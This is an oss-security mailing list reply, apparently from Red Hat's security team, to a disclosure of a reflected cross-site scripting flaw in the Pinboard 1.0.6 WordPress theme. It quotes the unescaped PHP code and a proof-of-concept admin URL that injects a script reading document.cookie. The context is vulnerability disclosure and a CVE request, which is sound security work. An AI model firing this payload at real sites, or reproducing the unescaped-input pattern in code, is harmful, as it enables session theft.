
Date: Wed, 13 Feb 2013 03:03:46 -0700
From: Kurt Seifried <kseifried@...hat.com>
To: oss-security@...ts.openwall.com
CC: Henrique Montenegro <typoon@...il.com>
Subject: Re: Wordpress Pinboard theme XSS

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

On 02/09/2013 06:47 AM, Henrique Montenegro wrote:
> Hello!
> 
> I am writing to notify you about a XSS I have found in the free
> Pinboard 1.0.6 theme for Wordpress. This XSS happens in one of the
> administration pages so it can only be triggered by authenticated
> users.
> 
> Here is the part of the code that is compromised 
> (includes/theme-options.php):
> 
> <?php $tab = ( isset( $_GET['tab'] ) ? $_GET['tab'] : 'general' );
> ?> <input name="pinboard_theme_options[submit-<?php echo $tab;
> ?>]" type="submit" class="button-primary" value="<?php _e( 'Save
> Settings', 'pinboard' ); ?>" /> <input
> name="pinboard_theme_options[reset-<?php echo $tab; ?>]" 
> type="submit" class="button-secondary" value="<?php _e( 'Reset
> Defaults', 'pinboard' ); ?>" />
> 
> The issue happens because the variable $_GET['tab'] is not being
> properly escaped, causing the issue.
> 
> Here is a proof of concept:
> 
> http://wordpress_site_with_active_pinboard_theme/wp-admin/themes.php?page=pinboard_options&tab=
>
> 
]"><script>alert(document.cookie)</script>
> 
> For accessing the URL directly, Firefox should be used as Chrome
> seems to have some anti-XSS protections in place.
> 
> Could a CVE please be assigned to this?
> 
> Regards,
> 
> Henrique

Can you please post the download links/have you notified upstream? THanks.

- -- 
Kurt Seifried Red Hat Security Response Team (SRT)
PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.13 (GNU/Linux)

iQIcBAEBAgAGBQJRG2UCAAoJEBYNRVNeJnmT9vUQAKwtiUFoa2uNAZM8b5zf/v9R
TmTNbYnQpjcau8CUIhlYOBkJbSJBcOAT5YggpWw3jeHjC1HpcKrWwFx963gzx+Ai
e+gu/Q5+gD6cIGktXKXHyPrGsXXJjOVwYNoVxyIQ7iuGD1PWEpbploWODyMN4YbN
YhHovtljdwI4U/srtNf0zRvFqQTvppeB3xK3A8JTwjc/3W/0PjvKwGIB6C/dhYEi
Jzf5P7MiDN9G69zZan3zDEMLhofu2O6aqMf9cTliAp+gHkTvYImkZRKGQ0kRZbfu
UjLEG6vY85H+kwFiPRqnlLKmMLM0eNizZs8k2f35mZwu6+Vo/TxLX5a/Vg8q4fwc
x9CuSBgR/y93bf+lXMcrcotoXnZ+Prk3MaLphrdkqoW5bb7yu1n9X/shllFLwn/c
m1k54Ok7Ec3/332WDVW2YQyhhAg3snbHlltYaYz85pzvFiEh9Zw5OXcBGvhvwKml
YrgpuRdW2Rw/eJQcK/fz0AQxspGQE/PA3lOgYj5If/+ELaKi1koyJYSIjWFmjSmC
oyLn2tXJHL05CdkLlKyD3Z+7OseOolkrxX7CsucXMLEVgO1DSU77T4QA1DyU+/y9
J6F4zrcYxhfZoGBz6wa9s907HxfBgS4t6Vs5+sNhxPJBgAHdSJi3PYCfP6Gw3TWK
/W8bTp/sz/cPILgnsZS5
=xtL+
-----END PGP SIGNATURE-----
